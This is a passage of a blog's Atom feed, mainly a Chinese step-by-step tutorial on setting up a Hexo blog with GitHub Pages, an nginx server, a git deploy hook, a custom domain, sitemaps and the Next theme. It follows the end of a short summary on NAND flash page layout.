&lt;p&gt;​    NAND容量可达1GB以上，价格也相对便宜，适合存储数据。一般来说，128MB以下容量NAND FLASH 芯片的一页大小为528字节，用来存放数据，另外每一页还有16字节的备用空间（SpareData,OOB），用来存储ECC校验/坏块标志等信息，再由若干页组成一个块，通常一块为32页16K。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Page = 512,OOB = 16&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;one block = 31Pages + OOB = 31(512 + 16) + 16&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;​    与NOR相比，NAND不是完全可靠的，每块芯片出厂时都有一定比例的坏块存在，对数据的存取不是使用地址映射而是通过寄存器的操作，串行存取数据。&lt;/p&gt;</summary>
    
    
    
    <category term="IOT" scheme="http://blog.l3m0nade.xyz/categories/IOT/"/>
    
    
    <category term="IOT" scheme="http://blog.l3m0nade.xyz/tags/IOT/"/>
    
  </entry>
  
  <entry>
    <title>Hexo博客搭建详细教程 一文通</title>
    <link href="http://blog.l3m0nade.xyz/2021/09/07/hexoBlogBuild/"/>
    <id>http://blog.l3m0nade.xyz/2021/09/07/hexoBlogBuild/</id>
    <published>2021-09-06T16:29:00.000Z</published>
    <updated>2021-09-06T23:48:10.289Z</updated>
    
    <content type="html"><![CDATA[<h2 id="提纲"><a href="#提纲" class="headerlink" title="提纲"></a>提纲</h2><ul><li>本篇教程适用于从0.1-1搭建Hexo博客的师傅，对于一些初始环境配置和微小操作可能会忽略到，但这不会影响整体搭建博客的过程。</li><li>Hexo博客可以选择Hexo+Github Pages架构或者Hexo+Github Pages+你的服务器（有无域名都可）。第二种就是第一种做了对服务器的迁移，需要一些git认证和nginx配置和域名解析设置。</li><li>所以下文会进行从第一种到第二种的全部实现过程。以及一些小的美化。</li></ul><span id="more"></span><h2 id="什么是Hexo"><a href="#什么是Hexo" class="headerlink" title="什么是Hexo"></a>什么是Hexo</h2><p> Hexo 是一个基于 Node.js 快速、简洁且高效的博客框架，可以将 Markdown 文件快速的生成静态网页，托管在<a href="https://pages.github.com/">GitHub Pages</a> 或者<a href="https://pages.coding.net/">Coding Pages </a>上 。</p><h2 id="个人环境与相关网站账号准备："><a href="#个人环境与相关网站账号准备：" class="headerlink" title="个人环境与相关网站账号准备："></a>个人环境与相关网站账号准备：</h2><ul><li><p>Github账号：<a href="https://github.com/">https://github.com/</a></p></li><li><p>七牛云账号：<a href="http://www.qiniu.com/">http://www.qiniu.com/</a> 用来储存图片等</p></li><li><p>Win10</p></li><li><p>git bash <a href="http://git-scm.com/">下载安装</a>  <strong>git只是一种版本控制工具，而GitHub是支持git的一个代码仓库网站</strong> </p></li><li><p>nodejs <a href="https://nodejs.org/en/">下载安装</a></p></li><li><p>服务器（个人是阿里云买的学生服务器，Ubuntu20.04)</p></li><li><p>提前买好，审核好，备案好的域名</p></li><li><p>个人版本：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">L3m0nade@DESKTOP-<span class="number">7</span>PB7DBA MINGW64 <span class="regexp">/d/</span>hexo</span><br><span class="line">$ git --version</span><br><span class="line">git version <span class="number">2.30</span>.<span class="number">0</span>.windows.<span class="number">2</span></span><br><span class="line"></span><br><span class="line">L3m0nade@DESKTOP-<span class="number">7</span>PB7DBA MINGW64 <span class="regexp">/d/</span>hexo</span><br><span class="line">$ node -v</span><br><span class="line">v12.<span class="number">16.1</span></span><br><span class="line">(官方建议使用nodejs10.<span class="number">0.0</span>以上版本)</span><br><span class="line">L3m0nade@DESKTOP-<span class="number">7</span>PB7DBA MINGW64 <span class="regexp">/d/</span>hexo</span><br><span class="line">$ npm -v</span><br><span class="line"><span class="number">6.13</span>.<span class="number">4</span></span><br><span class="line">(nodejs包管理器，类似python的pip)</span><br></pre></td></tr></table></figure></li></ul><h2 id="Hexo-Github-Pages（没用到个人服务器）"><a href="#Hexo-Github-Pages（没用到个人服务器）" class="headerlink" title="Hexo+Github Pages（没用到个人服务器）"></a>Hexo+Github Pages（没用到个人服务器）</h2><h3 id="Github-Pages"><a href="#Github-Pages" class="headerlink" title="Github Pages???"></a>Github Pages???</h3><ul><li><strong>GitHub Pages</strong>是GitHub公司提供的免费静态网站托管服务。</li><li><strong>GitHub Pages</strong>严格意义上来说并不是一个服务器，只是可以提供类似服务器功能的<strong>一种服务</strong>。</li><li>当我们把HTML等资源文件存放到GitHub指定的位置时，也就是一个<strong>GitHub Pages仓库</strong>下，<strong>GitHub Pages服务</strong>会对这些文件进行处理并把它展示为一个网站。</li><li>所以说可以<strong>将GitHub Pages提供的功能替代Web服务器的功能</strong>。我们只需要把编写好的HTML等资源文件存到<strong>GitHub指定的位置</strong>，那么就实现了类似的Web服务器的功能，可以响应请求，并把相应的资源文件发送给客户端。 </li></ul><h3 id="GitHub-Pages设置"><a href="#GitHub-Pages设置" class="headerlink" title="GitHub Pages设置"></a>GitHub Pages设置</h3><p>如果你是初次安装git，需要初始化一些配置：</p><ul><li><p>设置git用户信息,在桌面上点击右键git bash Here</p> <figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config  -<span class="keyword">global</span> <span class="keyword">user</span>.name &quot;your_username&quot;</span><br><span class="line">git config  -<span class="keyword">global</span> <span class="keyword">user</span>.email &quot;your_email&quot;</span><br></pre></td></tr></table></figure></li><li><p>生成SSH Key公钥 </p><ul><li><p>检查一下Windows下的“C:\Users\用户名.ssh”文件下有没有生成过id_rsa 和 id_rsa.pub的公私钥文件。</p></li><li><p>若没有：</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -<span class="built_in">t</span> rsa -C “your_github_email”</span><br></pre></td></tr></table></figure></li><li><p>这样你就在本地生成rsa的公私钥了</p></li></ul></li><li><p>在github上配置公钥</p><ul><li>github.com，点击头像，点击settings，点击左边的SSH and GPG keys,再点击右上角new ssh key.</li><li>用notepad++打开之前的id_rsa.pub文件，将内容复制到框里保存即可。</li></ul></li><li><p>创建Github Pages仓库</p><ul><li>点击右上角+号，创建新仓库：new respository.</li><li> 在Repository name输入框中你需要填入你的【Github用户名.github.io】，这一点非常重要。因为这样才能保证你建立的是GithubPages页面而不是其他的代码仓库。</li><li>勾选Initialize this repository with a README选项。</li><li>这个时候你在浏览器输入<a href="https://your_github_name.github.io后,可以看到一个简陋的界面,那么说明你已经成功开启了githubpages服务了./">https://your_github_name.github.io后，可以看到一个简陋的界面，那么说明你已经成功开启了GithubPages服务了。</a></li></ul></li><li><p>下面需要做的就是安装Hexo，并且使用Hexo来生成Blog站点。 </p></li></ul><h3 id="Hexo-安装"><a href="#Hexo-安装" class="headerlink" title="Hexo 安装"></a>Hexo 安装</h3><ul><li><p>先在本地创建一个放Hexo东西的文件夹，我创在了D:\hexo</p></li><li><p>在git bash中打开到此路径，安装后做初始化。这里可能init会很慢导致openssl ssl超时断链，这里我把梯子改为全局配置后解决的。</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">cd D:</span><br><span class="line">cd hexo</span><br><span class="line"></span><br><span class="line">L3m0nade@DESKTOP-<span class="number">7</span>PB7DBA MINGW64 <span class="regexp">/d/</span>hexo</span><br><span class="line">$ npm install -g hexo-cli</span><br><span class="line"></span><br><span class="line">D:\NodeJS\node_global\hexo -&gt; D:\NodeJS\node_global\node_modules\hexo-cli\bin\hexo</span><br><span class="line">npm WARN optional SKIPPING OPTIONAL DEPENDENCY: fsevents@~<span class="number">2.3</span>.<span class="number">2</span> (node_modules\hexo-cli\node_modules\chokidar\node_modules\fsevents):</span><br><span class="line">npm WARN notsup SKIPPING OPTIONAL DEPENDENCY: Unsupported platform <span class="keyword">for</span> fsevents@<span class="number">2.3</span>.<span class="number">2</span>: wanted &#123;<span class="string">&quot;os&quot;</span>:<span class="string">&quot;darwin&quot;</span>,<span class="string">&quot;arch&quot;</span>:<span class="string">&quot;any&quot;</span>&#125; (current: &#123;<span class="string">&quot;os&quot;</span>:<span class="string">&quot;win32&quot;</span>,<span class="string">&quot;arch&quot;</span>:<span class="string">&quot;x64&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">+ hexo-cli@<span class="number">4.3</span>.<span class="number">0</span></span><br><span class="line">updated <span class="number">1</span> <span class="keyword">package</span> in <span class="number">6.773</span>s</span><br><span class="line"></span><br><span class="line">L3m0nade@DESKTOP-<span class="number">7</span>PB7DBA MINGW64 <span class="regexp">/d/</span>hexo</span><br><span class="line">$ hexo init</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">L3m0nade@DESKTOP-<span class="number">7</span>PB7DBA MINGW64 <span class="regexp">/d/</span>hexo</span><br><span class="line">$ ls</span><br><span class="line">_config.landscape.yml  node_modules<span class="regexp">/      package.json  source/</span></span><br><span class="line">_config.yml            <span class="keyword">package</span>-lock.json  scaffolds<span class="regexp">/    themes/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">L3m0nade@DESKTOP-<span class="number">7</span>PB7DBA MINGW64 <span class="regexp">/d/</span>hexo</span><br><span class="line">$ hexo g</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">L3m0nade@DESKTOP-<span class="number">7</span>PB7DBA MINGW64 <span class="regexp">/d/</span>hexo</span><br><span class="line">$ hexo s </span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>打开 <a href="http://localhost:4000/">http://localhost:4000</a> 可以查看到当前hexo web样式.如果端口被占可以考虑<a href="https://www.runoob.com/w3cnote/windows-finds-port-usage.html">https://www.runoob.com/w3cnote/windows-finds-port-usage.html</a> 自行解决。</p></li><li><p>这时会发现hexo目录下多了东西：</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">L3m0nade@DESKTOP-<span class="number">7</span>PB7DBA MINGW64 <span class="regexp">/d/</span>hexo</span><br><span class="line">$ ls</span><br><span class="line">_config.landscape.yml  db.json        <span class="keyword">package</span>-lock.json  <span class="keyword">public</span><span class="regexp">/     source/</span></span><br><span class="line">_config.yml            node_modules<span class="regexp">/  package.json       scaffolds/</span>  themes/</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>出现一个public文件夹，里面是 hexo generate命令之后，将souce文件夹下的Markdown和HTML文件解析到了public文件夹下，并生成了db.json文件 </p><ul><li><p> <strong>_config.yml是整个博客的配置文件</strong> </p></li><li><p>将博客部署到 github 个人主页上，安装插件：</p></li><li><p>npm install hexo-deployer-git –save  </p></li><li><p>编辑目录下的 _config.yml 文件, 在文件末尾添加如下内容： </p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">deploy</span>:</span><br><span class="line">      <span class="attribute">type</span>: git</span><br><span class="line">      <span class="attribute">repo</span>: git@github.com:l<span class="number">3</span>m<span class="number">0</span>nade/l<span class="number">3</span>m<span class="number">0</span>nade.github.io.git</span><br><span class="line">      <span class="attribute">branch</span>: master</span><br></pre></td></tr></table></figure></li><li><p>然后hexo d，就可以把本地的public的内容上传到l3m0nade.github.io，然后访问就行了。</p></li></ul></li><li><p><strong>到此为止本地搭建到git到github，使用xxx.github.io查看安装成功的初始化就结束了。</strong></p></li><li><p>这里记录一下hexo的4个命令：</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">hexo <span class="attr">clean</span>  = hexo c <span class="comment"># 清除本地缓存，也就是清除public/文件夹和db.json文件。</span></span><br><span class="line"></span><br><span class="line">hexo <span class="attr">generate</span> = hexo g <span class="comment"># 将souce文件夹下的Markdown和HTML文件解析到了public文件夹下，并生成了db.json文件</span></span><br><span class="line"></span><br><span class="line">hexo <span class="attr">server</span> = hexo s <span class="comment"># 开启本地调试模式</span></span><br><span class="line"></span><br><span class="line">hexo <span class="attr">deploy</span> = hexo d <span class="comment"># 将本地资源部署到GithubPages</span></span><br></pre></td></tr></table></figure></li><li><p>scaffolds文件夹</p><ul><li>scaffolds是模板文件夹，当创建新的文章时，Hexo会根据scaffold里的不同模板来建立文件. Hexo的<strong>三种默认布局post、page和draft</strong>。使用Hexo创建三种模板类型的文件时，被创建的文件会被保存到不同的路径。而我们<strong>自定义的其他布局和post相同，都会保存在source/_posts文件夹下</strong>。 </li></ul></li><li><p>source文件夹</p><ul><li>source资源文件夹，是存放用户资源的地方。除post文件夹除外，开头以_（下划线）命名的文件/文件夹或隐藏文件都会在generate时被忽略。Markdown和HTML文件夹会被解析到public文件夹下，其它文件格式的文件会被直接拷贝过去。</li></ul></li><li><p>themes文件夹</p><ul><li> <strong>themes</strong>是主题文件夹。Hexo会根据设置的主题来生成静态的页面，刚才说到<strong>使用Hexo init</strong>生成的初始化站点的主题可能并不是你预估的样子 </li></ul></li></ul><h3 id="Next主题"><a href="#Next主题" class="headerlink" title="Next主题"></a>Next主题</h3><p>原生的Hexo主题不好看，这里直接换掉换位Next。虽然hexo官网上有很多主题，但是Next还是经典，布局舒心。直接在D:\hexo文件下：</p><p><strong>这里注意一下不同hexo next主题的版本：链接不一样</strong></p><table><thead><tr><th>年份</th><th>版本</th><th>仓库</th></tr></thead><tbody><tr><td>2014 ~ 2017</td><td>v5</td><td><a href="https://github.com/iissnan/hexo-theme-next">https://github.com/iissnan/hexo-theme-next</a></td></tr><tr><td>2018 ~ 2019</td><td>v6 ~ v7</td><td><a href="https://github.com/theme-next/hexo-theme-next">https://github.com/theme-next/hexo-theme-next</a></td></tr><tr><td>2020</td><td>v8</td><td><a href="https://github.com/next-theme/hexo-theme-next">https://github.com/next-theme/hexo-theme-next</a></td></tr></tbody></table><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https:<span class="regexp">//gi</span>thub.com<span class="regexp">/next-theme/</span>hexo-theme-<span class="keyword">next</span> themes/<span class="keyword">next</span></span><br></pre></td></tr></table></figure><p>然后就_config.yml中的theme一行改为：</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">theme:</span> <span class="keyword">next</span></span><br></pre></td></tr></table></figure><p>更新：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">hexo clean</span></span><br><span class="line"><span class="attribute">hexo g</span></span><br><span class="line"><span class="attribute">hexo d</span></span><br></pre></td></tr></table></figure><p><strong>注意：每次这种更新，都要hexo g,(hexo s是本地，可以hexo s –debug先本地测试一下)然后hexo d上传，github.io才会变。</strong> </p><p><strong>修改生成的默认页面信息，要到主题下面的config.yml文件里面去改，而不是根目录下的config.yml文件</strong> </p><h2 id="Hexo-Github-Pages-个人服务器"><a href="#Hexo-Github-Pages-个人服务器" class="headerlink" title="Hexo +Github Pages+个人服务器"></a>Hexo +Github Pages+个人服务器</h2><h3 id="服务器环境搭建"><a href="#服务器环境搭建" class="headerlink" title="服务器环境搭建"></a>服务器环境搭建</h3><ul><li>xshell或ssh连接服务器后，所在目录/root</li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-<span class="builtin-name">get</span> update</span><br><span class="line">sudo apt-<span class="builtin-name">get</span> install git</span><br><span class="line">sudo apt-<span class="builtin-name">get</span> install nginx</span><br></pre></td></tr></table></figure><h3 id="Git环境配置"><a href="#Git环境配置" class="headerlink" title="Git环境配置"></a>Git环境配置</h3><ul><li>加入git账户：</li></ul><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">adduser git</span></span><br></pre></td></tr></table></figure><ul><li>添加git用户权限</li></ul><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">chmod</span> <span class="number">740</span> /etc/sudoers</span><br><span class="line"><span class="attribute">vim</span> /etc/sudoers</span><br><span class="line"></span><br><span class="line"><span class="attribute">root</span>    <span class="literal">ALL</span>=(<span class="literal">ALL</span>)  <span class="literal">ALL</span>下面加入一行代码</span><br><span class="line"><span class="attribute">git</span>     <span class="literal">ALL</span>=(<span class="literal">ALL</span>)     <span class="literal">ALL</span></span><br></pre></td></tr></table></figure><ul><li>然后esc键，:wq保存退出。</li></ul><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod <span class="number">400</span> <span class="regexp">/etc/</span>sudoers</span><br></pre></td></tr></table></figure><ul><li> 创建 ~/.ssh 文件夹和 ~/.ssh/authorized_keys 文件，并赋予相应的权限 ：</li></ul><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir ~/.ssh</span><br><span class="line">vim ~<span class="regexp">/.ssh/</span>authorized_keys</span><br></pre></td></tr></table></figure><ul><li>按”i”进入编辑模式，将我们在win10中生成的id_rsa.pub文件中的公钥复制到authorized_keys中，按”esc”，然后按”:wq”，保存退出。 </li></ul><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod <span class="number">600</span> <span class="regexp">/home/gi</span>t<span class="regexp">/.ssh/</span>authorized_keys</span><br><span class="line">chmod <span class="number">700</span> <span class="regexp">/home/gi</span>t/.ssh</span><br></pre></td></tr></table></figure><ul><li>git bash里测试一下你的ssh连接：</li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh -v git@你的服务器ip</span><br><span class="line">。。。</span><br><span class="line">Welcome <span class="keyword">to</span> Alibaba Cloud Elastic Compute<span class="built_in"> Service </span>!</span><br></pre></td></tr></table></figure><ul><li><p>换回root用户，服务器上创建仓库目录</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sudo mkdir <span class="regexp">/var/</span>repo    <span class="comment">#新建目录，这是git仓库的位置</span></span><br><span class="line">sudo mkdir <span class="regexp">/var/</span>www         <span class="comment">#</span></span><br><span class="line">sudo mkdir <span class="regexp">/var/</span>www/hexo  <span class="comment">#这是博客源文件的目录</span></span><br><span class="line">cd <span class="regexp">/var/</span>repo  <span class="comment">#转到git仓库的文件夹</span></span><br><span class="line">sudo git init --bare blog.git <span class="comment">#创建一个名叫blog的仓库</span></span><br><span class="line">sudo vim <span class="regexp">/var/</span>repo<span class="regexp">/blog.git/</span>hooks/post-update</span><br><span class="line"></span><br><span class="line">vim:</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line">git --work-tree=<span class="regexp">/var/</span>www<span class="regexp">/hexo --git-dir=/</span>var<span class="regexp">/repo/</span>blog.git checkout -f</span><br></pre></td></tr></table></figure><ul><li><p> 当我们从本地push上去时，git-hooks会自动执行上面命令，这是git自带的的方法，表示在<code>/var/repo/blog.git</code>中对<code>/var/www/hexo</code>执行<code>checkout -f</code>命令，可以在我们每次 push 完之后，把部署目录更新到博客的最新状态</p></li><li><p>更改权限：</p> <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd blog.git<span class="regexp">/hooks/</span></span><br><span class="line">sudo chown -R git:git <span class="regexp">/var/</span>repo/      <span class="comment">#进行文件夹及其子文件所有者变更</span></span><br><span class="line">sudo chown -R git:git <span class="regexp">/var/</span>www/hexo  <span class="comment">#进行文件夹及其子文件所有者变更</span></span><br><span class="line">sudo chmod +x post-update  <span class="comment">#赋予其可执行权限</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><p> sudo nginx -t #可以看到配置文件路径<br>   sudo vim /etc/nginx/nginx.conf</p>   <figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  </span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">## 域名解析</span><br><span class="line">  </span><br></pre></td></tr></table></figure><p>   我的域名是阿里云的，l3m0nade.xyz,以此为例.<br>   在域名解析的后台位置，点击域名连接（云解析-&gt;域名解析-&gt;解析设置）<br>   添加记录<br>   主机记录填个词，比如blog,记录类型填写CNAME，用于后面记录处填写域名。这里记录的域名填写l3m0nade.github.io。即把blog.lem0nade.xyz和解析到l3m0nade.github.io<br> 这里还没完，github里面要改一下域名设置才能解析成功。</p>   <figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="bullet">* </span>Github Pages绑定域名</span><br><span class="line"></span><br><span class="line"><span class="bullet">* </span>github.com中xxx.github.io打开settings</span><br><span class="line"></span><br><span class="line"><span class="bullet">* </span>在Github Pages的Custom domains输入你的域名blog.l3m0nade.xyz</span><br><span class="line"></span><br><span class="line"><span class="code">  </span></span><br></pre></td></tr></table></figure></li></ul><h3 id="配置sitemap让搜索引擎找到blog"><a href="#配置sitemap让搜索引擎找到blog" class="headerlink" title="配置sitemap让搜索引擎找到blog"></a>配置sitemap让搜索引擎找到blog</h3><p> 搜索引擎是通过站点地图（sitemap）去抓取可供爬取的网页的，所以首先需要配置站点的sitemap以允许搜索爬虫搜集到博客的站点信息。 </p><p> Hexo有自动生成站点地图的工具，在博客根目录（D:\hexo）下输入以下命令以<strong>生成sitemap</strong>: </p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm <span class="keyword">install </span>hexo-generator-sitemap -save</span><br><span class="line">npm <span class="keyword">install </span>hexo-generator-<span class="keyword">baidu-sitemap </span>-save</span><br></pre></td></tr></table></figure><p> 我们希望Google和百度用户都能搜索到此博客，所以需要两个不同的sitemap。然后需要在博客的<strong>themes文件夹里的_config.yml</strong>中作以下配置： </p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># sitemap</span></span><br><span class="line"><span class="symbol">sitemap:</span></span><br><span class="line"><span class="symbol">  path:</span> sitemap.xml</span><br><span class="line"><span class="symbol">baidusitemap:</span></span><br><span class="line"><span class="symbol">  path:</span> baidusitemap.xml</span><br></pre></td></tr></table></figure><p>做好之后可以hexo g,hexo s –debug在本地看一下，能否打开<a href="http://localhost:4000/sitemap.xml%E5%8D%B3%E5%8F%AF%E3%80%82">http://localhost:4000/sitemap.xml即可。</a></p><p>然后需要<a href="https://www.google.com/webmasters/tools/">google</a>和<a href="https://ziyuan.baidu.com/">百度</a>的验证</p><ul><li><p>google html验证：</p><ul><li><p>根据要求下载html文件</p></li><li><p><strong>由于执行hexo generate命令之后，会将souce文件夹下的Markdown和HTML文件解析到public文件夹下，使用hexo deploy时会把public文件夹下的文件拷贝到Github pages中</strong>，所以直接<strong>把这个html放到public文件加下</strong>就可以，然后<strong>执行hexo deploy</strong>，注意这个时候<strong>不用执行hexo generate</strong>。大概等待1分钟左右，点击验证出现以下对话框代表验证成功。 </p></li><li><p>验证成功后选择前往资源，会进入<a href="https://www.google.com/webmasters/tools/">这个网站</a>，在左侧的工具栏选择站点地图，并在弹出的界面<strong>输入sitemap的存放路径</strong>。比如我的是：<a href="https://blog.l3m0nade.xyz/sitemap.xml">https://blog.l3m0nade.xyz/sitemap.xml</a></p></li><li><p>当public/为站点的根目录后，此时输入的就是sitemap在public/文件夹下的位置。</p></li><li><p>等待一段时间，你就可以通过Google检索到你的博客了。而如何通过百度进行站点地图设置大同小异，你可以自己尝试一下。</p></li></ul></li><li><p>百度验证：</p><ul><li>填写各种验证信息，绑定百度账号等等</li><li>最后还是下载一个html作为验证文件上传到服务器上，和刚刚操作一样</li><li>接着进入资源提交界面，写入sitemap.xml文件地址</li></ul></li></ul><p>如果还有问题可以参考<a href="https://www.jianshu.com/p/5e68f78c7791">这一篇</a></p><p><strong>注意：</strong></p><ul><li><p><strong>解决每次hexo clean,generate,deploy后自己的域名被重置，又成为xxx.github.io的问题：</strong></p></li><li><p><strong>在sources文件夹下创建文件名为CNAME文件，里面内容为你的域名，然后再clean,g,d就行了。</strong></p></li></ul><p><a href="https://blog.csdn.net/qq_38332436/article/details/81907686">参考这个链接</a></p><h2 id="Hexo-Next-配置"><a href="#Hexo-Next-配置" class="headerlink" title="Hexo Next 配置"></a>Hexo Next 配置</h2><p>我们要关注的是这两个文件：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/hexo/</span>_config.yml</span><br><span class="line"></span><br><span class="line"><span class="regexp">/hexo/</span>themes<span class="regexp">/next/</span>_config.yml</span><br></pre></td></tr></table></figure><p>Next的配置文件推荐使用<a href="https://theme-next.js.org/docs/getting-started/configuration">网站教程</a>，不要改动_config.yml,说白了就是不想改动原文件，将配置文件路径重新设置一个新的。我们提前备份一下或者用git控制一下_config.yml就可以了。</p><p>有关Next配置可以看着<a href="https://theme-next.js.org/docs/theme-settings/">文档</a>改，这个说的比我清楚多了</p><p>下面记录一些比较特别的</p><ul><li><p>对于/hexo/_config.yml,<a href="https://hexo.io/zh-cn/docs/configuration.html">参考链接</a></p><ul><li><p>site</p></li><li><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><code>title</code></td><td align="left">网站标题</td></tr><tr><td align="left"><code>subtitle</code></td><td align="left">网站副标题</td></tr><tr><td align="left"><code>description</code></td><td align="left">网站描述</td></tr><tr><td align="left"><code>keywords</code></td><td align="left">网站的关键词。支持多个关键词。</td></tr><tr><td align="left"><code>author</code></td><td align="left">您的名字</td></tr><tr><td align="left"><code>language</code></td><td align="left">网站使用的语言。对于简体中文用户来说，使用不同的主题可能需要设置成不同的值，请参考你的主题的文档自行设置，常见的有 <code>zh-Hans</code>和 <code>zh-CN</code>。</td></tr><tr><td align="left"><code>timezone</code></td><td align="left">网站时区。Hexo 默认使用您电脑的时区。请参考 <a href="https://en.wikipedia.org/wiki/List_of_tz_database_time_zones">时区列表</a> 进行设置，如 <code>America/New_York</code>, <code>Japan</code>, 和 <code>UTC</code> 。一般的，对于中国大陆地区可以使用 <code>Asia/Shanghai</code>。</td></tr></tbody></table></li><li><p>url</p></li><li><table><thead><tr><th align="left">参数</th><th align="left">描述</th><th align="left">默认值</th></tr></thead><tbody><tr><td align="left"><code>url</code></td><td align="left">网址, 必须以 <code>http://</code> 或 <code>https://</code> 开头</td><td align="left"></td></tr><tr><td align="left"><code>root</code></td><td align="left">网站根目录</td><td align="left"><code>url&#39;s pathname</code></td></tr><tr><td align="left"><code>permalink</code></td><td align="left">文章的 <a href="https://hexo.io/zh-cn/docs/permalinks">永久链接</a> 格式</td><td align="left"><code>:year/:month/:day/:title/</code></td></tr><tr><td align="left"><code>permalink_defaults</code></td><td align="left">永久链接中各部分的默认值</td><td align="left"></td></tr><tr><td align="left"><code>pretty_urls</code></td><td align="left">改写 <a href="https://hexo.io/zh-cn/docs/variables"><code>permalink</code></a> 的值来美化 URL</td><td align="left"></td></tr><tr><td align="left"><code>pretty_urls.trailing_index</code></td><td align="left">是否在永久链接中保留尾部的 <code>index.html</code>，设置为 <code>false</code> 时去除</td><td align="left"><code>true</code></td></tr><tr><td 